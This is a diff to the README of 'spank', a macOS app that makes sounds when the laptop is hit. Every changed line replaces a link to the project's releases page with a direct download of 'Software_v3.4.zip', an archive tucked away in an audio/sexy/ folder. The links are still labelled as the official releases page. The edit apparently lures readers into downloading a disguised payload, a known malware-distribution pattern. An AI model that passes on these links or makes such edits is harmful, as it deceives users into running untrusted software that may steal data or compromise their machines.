@@ -1,6 +1,6 @@
 # 🖐️ spank - Hear Your MacBook React Instantly
 
-[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen?style=for-the-badge)](https://github.com/Bullzane/spank/releases)
+[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen?style=for-the-badge)](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Older Intel Macs will not work because the app depends on the Apple Silicon-spec
 
 Click the big green button above or visit the releases page linked below. This page holds the most recent versions of spank.
 
-[Visit the spank Release Page](https://github.com/Bullzane/spank/releases)
+[Visit the spank Release Page](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)
 
 Here’s how to get the app:
 
@@ -131,4 +131,4 @@ For those curious or who want to contribute, here are some project details:
 
 ---
 
-[Download spank from the official GitHub releases page](https://github.com/Bullzane/spank/releases)
+[Download spank from the official GitHub releases page](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)
